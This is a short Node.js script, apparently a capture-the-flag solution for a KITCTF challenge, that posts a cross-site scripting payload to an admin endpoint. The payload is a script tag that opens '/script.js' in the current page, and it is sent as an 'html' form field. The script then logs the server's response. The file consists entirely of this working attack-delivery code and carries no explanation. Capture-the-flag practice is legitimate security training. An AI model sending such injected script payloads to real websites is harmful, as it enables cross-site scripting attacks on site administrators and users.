const axios = require('axios');
const qs = require('qs');

async function sendPayload() {
  const payload = `<script>window.open('/script.js', '_self');</script>`;
  
  const data = qs.stringify({ html: payload });

  try {
    const response = await axios.post('https://xxxx.ctf.kitctf.de/admin', data, {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      }
    });

    console.log('Payload sent successfully');
    console.log('Response:', response.data);
  } catch (error) {
    console.error('Error sending payload:', error.response ? error.response.data : error.message);
  }
}

sendPayload();
